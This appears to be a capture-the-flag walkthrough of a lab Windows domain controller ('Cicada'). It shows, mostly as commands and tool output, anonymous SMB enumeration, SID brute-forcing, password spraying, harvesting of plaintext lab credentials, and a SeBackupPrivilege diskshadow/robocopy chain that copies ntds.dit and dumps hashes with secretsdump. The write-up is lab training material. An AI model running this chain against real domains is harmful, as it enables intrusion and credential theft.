## Samba ENUM

```
└─$ smbclient -N -L //10.129.37.115 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

```

the HR Share is accessible
`smbclient -N  //10.129.37.115/HR`

`get "Notice from HR.txt"`
```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

`Cicada$M6Corpb*@Lp#nZp!8`
Let's perform user enum!
```
└─$ sudo impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)

```
Valid users:
```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Let's find out which user account is still using the company default password.

```
SMB         10.129.37.115   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```


Next step is looking for Active Directory metadata.

```
└─$ nxc smb 10.129.37.115 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users 
SMB         10.129.37.115   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.37.115   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.37.115   445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-   
SMB         10.129.37.115   445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain
SMB         10.129.37.115   445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.37.115   445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account
SMB         10.129.37.115   445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2        
SMB         10.129.37.115   445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.37.115   445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.37.115   445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.129.37.115   445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.129.37.115   445    CICADA-DC        [*] Enumerated 8 local users: CICADA

```
`david.orelious:aRt$Lp#7t*VQ!3`

```
└─$ smbclient -U david.orelious //10.129.37.115/DEV
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
```

Backup_script.ps1
```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
`emily.oscars:Q!3@Lp#M6b*7t*Vt`

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
bc84d879e92d3f9e0cfbcf50e3b4831e
```

Dumping domain hashes - emily.oscars has SaBackupPrivilege role
```

script.txt==

set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:

unix2dos script.txt
upload script.txt script.txt
diskshadow /s script.txt

robocopy /b E:\Windows\ntds . ntds.dit

download ntds.dit ntds.dit

secretsdump.py -ntds ntds.dit -system system LOCAL
```

```
└─$ sudo impacket-secretsdump -sam sam.hive -sys system.hive -ntds ntds.dit LOCAL
[sudo] password for maty-work: 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
ee5d5ff9a7ecf0e7ca030d60c960abf8
```

## ROOTED!

